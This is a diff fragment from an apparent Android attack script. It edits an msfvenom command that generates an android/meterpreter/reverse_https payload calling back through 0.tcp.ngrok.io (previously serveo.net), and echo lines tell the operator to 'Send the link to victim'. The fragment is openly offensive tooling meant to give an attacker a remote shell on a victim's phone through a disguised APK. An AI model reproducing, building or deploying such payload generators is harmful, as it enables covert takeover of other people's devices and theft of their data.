@@ -26,7 +26,7 @@ echo [+] For Example : lente.serveo.net/yourpayload.apk | lolcat
 echo [+] Send the link to victim | lolcat
 echo [+] This may take a few minutes | lolcat
 echo ‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡ | lolcat
-msfvenom -p android/meterpreter/reverse_https LHOST=serveo.net LPORT=$port R> $HOME/Lemon/$name & PID=$!
+msfvenom -p android/meterpreter/reverse_https LHOST=0.tcp.ngrok.io LPORT=$port R> $HOME/Lemon/$name & PID=$!
 echo "Generating Payload.." | lolcat
 printf "["
 while kill -0 $PID 2> /dev/null; do
